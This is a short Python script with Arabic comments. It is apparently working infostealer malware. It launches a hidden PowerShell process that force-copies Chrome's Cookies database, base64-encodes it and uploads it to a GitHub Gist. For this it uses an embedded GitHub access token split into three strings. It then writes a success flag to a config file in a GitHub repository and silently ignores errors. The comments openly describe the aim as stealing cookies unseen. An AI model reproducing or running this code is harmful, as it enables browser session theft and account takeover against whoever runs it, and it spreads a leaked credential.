import os, subprocess, base64, requests

# التوكن الخاص بك (Gist Token)
A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
G_TOKEN = A + B + C

def force_gist_sync():
    # كود الـ PowerShell "العدواني" لسحب الكوكيز وتحويلها لنص
    # بيستخدم النسخ الإجباري عشان يتخطى قفل المتصفح
    ps_payload = f"""
    $c_path = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
    $temp = "$env:TEMP\\vault.db";
    if (Test-Path $c_path) {{
        Copy-Item $c_path $temp -Force;
        $bin = [IO.File]::ReadAllBytes($temp);
        $b64 = [Convert]::ToBase64String($bin);
        $body = @{{files=@{{'chrome_session.txt'=@{{content=$b64}}}}}} | ConvertTo-Json;
        Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{{'Authorization'="token {G_TOKEN}"}} -Body $body -ContentType 'application/json';
        Remove-Item $temp;
    }}
    """

    try:
        # تشغيل العملية في "وضع الشبح" (بدون أي نافذة سوداء)
        subprocess.run(["powershell", "-Command", ps_payload], creationflags=0x08000000)
        
        # تحديث Noor.json كإشارة نجاح فقط
        headers = {"Authorization": f"token {G_TOKEN}"}
        repo_url = "https://api.github.com/repos/Noor092324/Noor-config/contents/Noor.json"
        res = requests.get(repo_url, headers=headers).json()
        requests.put(repo_url, headers=headers, json={
            "message": "Sync Done",
            "content": base64.b64encode(b"Success: Data Sent to Gist").decode(),
            "sha": res['sha']
        })
    except:
        pass

if __name__ == "__main__":
    force_gist_sync()
    
